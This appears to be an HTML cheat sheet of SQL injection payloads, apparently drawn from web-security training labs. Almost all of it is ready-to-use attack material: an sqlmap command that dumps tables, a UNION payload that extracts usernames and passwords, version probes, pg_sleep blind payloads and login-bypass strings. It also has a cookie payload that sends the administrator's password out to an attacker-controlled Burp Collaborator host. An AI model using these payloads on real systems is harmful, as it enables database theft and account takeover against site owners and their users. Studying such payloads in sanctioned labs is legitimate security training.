<h1>SQL Injection</h1>

<p>-- o #</p>

<h2>Reflected SQL Injection:</h2>
<code>sqlmap --url https://$domain/filter?category=Lifestyle --dump --schema --tables --columns</code>

<p>Database: public</p>
<p>Table: users</p>

<h4>POC</h4>
<code>https://$domain/filter?category=Lifestyle'+UNION+SELECT+username,+password+FROM+users--</code>

<h5>Version</h5>
<p>First detect numbers of columns</p>
<p><code>' UNION SELECT NULL,@@version--</code></p>
<p><code>' UNION SELECT NULL,NULL,* FROM v$version--</code></p>
<p><code>' UNION SELECT banner FROM v$version--</code></p>
<p><code>' UNION SELECT version FROM v$instance--</code></p>
<p><code>' UNION SELECT version()--</code></p>
<hr>
<h2>Blind SQL Injection:</h2>
<p><code>';SELECT PG_SLEEP(5)--</code></p>
<p><code>'||pg_sleep(10)--</code></p>
<hr>
<h2>SQL Login</h2>
<p>In nickname, email and password test for:</p>
<p>name'--</p>
<p>pass'--</p>
<p>'+OR+1=1--</p>
<p>'+OR+2=2--</p>
<p>'+OR+5=5--</p>
<p>'+OR+'E'='E'--</p>
<hr>
<h2>Cookies</h2>
# Test cookies for https request - Blind:
```html
  <code>TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//YOUR-COLLABORATOR-ID.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--</code>
```

<p>Then for credentials.</p>

<p><code>TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.YOUR-COLLABORATOR-ID.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--.</code></p>
